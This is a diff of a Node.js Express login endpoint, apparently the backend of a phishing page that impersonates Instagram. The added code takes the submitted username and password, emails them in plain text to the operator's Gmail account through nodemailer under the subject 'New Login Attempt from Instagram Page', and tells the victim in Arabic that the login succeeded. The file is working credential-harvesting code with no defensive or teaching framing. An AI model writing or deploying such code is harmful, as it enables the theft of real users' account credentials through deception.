@@ -1,38 +1,40 @@
-// استيراد Express
 const express = require('express');
-const path = require('path');
+const nodemailer = require('nodemailer');
+require('dotenv').config();
 
-// إنشاء تطبيق Express
 const app = express();
-
-// Middleware لتحليل JSON القادم في الطلبات
 app.use(express.json());
 
-// نقطة النهاية (Endpoint) الخاصة بتسجيل الدخول
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: process.env.EMAIL_USER,
+    pass: process.env.EMAIL_PASS,
+  },
+});
+
 app.post('/api/login', (req, res) => {
   const { username, password } = req.body;
 
-  console.log('Login attempt received:');
-  console.log('Username:', username);
-  console.log('Password:', password);
-
-  // تحقق من وجود اسم المستخدم وكلمة المرور
   if (!username || !password) {
-    return res.status(400).json({
-      success: false,
-      message: 'يرجى إدخال اسم المستخدم وكلمة المرور.',
-    });
+    return res.status(400).json({ success: false, message: 'الحقول مطلوبة' });
   }
 
-  // هنا يمكنك إضافة منطق التحقق من صحة البيانات
-  // في هذا المثال، سنقوم فقط بإرجاع رسالة نجاح
-  
-  // إرسال استجابة نجاح
-  res.status(200).json({
-    success: true,
-    message: 'تم استلام بيانات تسجيل الدخول بنجاح!',
+  const mailOptions = {
+    from: process.env.EMAIL_USER,
+    to: process.env.EMAIL_USER,
+    subject: 'New Login Attempt from Instagram Page',
+    text: `Username: ${username}\nPassword: ${password}`,
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.error('Error sending email:', error);
+      return res.status(500).json({ success: false, message: 'حدث خطأ في الخادم' });
+    }
+    console.log('Email sent:', info.response);
+    res.status(200).json({ success: true, message: 'تم تسجيل الدخول بنجاح' });
   });
 });
 
-// تصدير التطبيق ليعمل مع Vercel
 module.exports = app;
